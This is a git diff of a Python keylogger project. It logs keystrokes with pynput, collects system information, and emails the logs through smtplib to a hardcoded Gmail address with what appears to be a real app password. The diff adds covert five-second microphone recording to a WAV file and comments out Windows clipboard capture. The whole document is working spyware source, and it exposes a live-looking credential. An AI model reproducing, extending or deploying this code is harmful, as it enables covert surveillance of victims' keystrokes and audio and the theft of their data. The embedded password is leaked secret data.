@@ -1,6 +1,7 @@
 from webbrowser import get
 
 import pynput
+from numpy.distutils.system_info import default_src_dirs
 from pynput.keyboard import Key, Listener
 
 from email.mime.multipart import MIMEMultipart
@@ -12,21 +13,29 @@ import smtplib
 import socket
 import platform
 
-import win32clipboard
+#import win32clipboard
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+
 
 keys_information = "key_log.txt"
 sys_information = "sys_info.txt"
 clipboard_information = "clip_info.txt"
+sound_information = "audio.wav"
 
 from_addr = "tharilaki82@gmail.com"
 toaddress = "tharilaki82@gmail.com"
 password = "wstqisdjuuvmgphe"
 body = "hiiiii"
 
-path = "E:\\Cyber security projects\\Keylogger\\keylogger\\project"
-extend = "\\"
+path = "/home/tharindu/Desktop/Keylogger/project"
+extend = "/"
 
 keys = []
+
+frequency = 44100
+microphone_time = 5
 
 
 def send_email(filename, attachment, toaddress):
@@ -78,16 +87,22 @@ def system_info():
 
 system_info()
 
-def clipboard_info():
-    with open(path + extend + clipboard_information, "a") as f:
-        try:
-            win32clipboard.OpenClipboard()
-            f.write(win32clipboard.GetClipboardData())
-        except Exception:
-            f.write("Can't get clipboard data\n")
+# def clipboard_info():
+#     with open(path + extend + clipboard_information, "a") as f:
+#         try:
+#             win32clipboard.OpenClipboard()
+#             f.write(win32clipboard.GetClipboardData())
+#         except Exception:
+#             f.write("Can't get clipboard data\n")
+#
+#         win32clipboard.CloseClipboard()
 
-        win32clipboard.CloseClipboard()
+def sound_info(fs, seconds):
+    my_recording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
+    sd.wait()
+    write(path + extend + sound_information, fs, my_recording)
 
+sound_info(frequency, microphone_time)
 
 
 
@@ -98,7 +113,7 @@ def press(key):
     keys =[]
 def release(key):
     if key == Key.esc:
-        clipboard_info()
+        #clipboard_info()
         send_email(keys_information, path + extend + keys_information, toaddress)
         send_email(sys_information, path + extend + sys_information, toaddress)
         return False
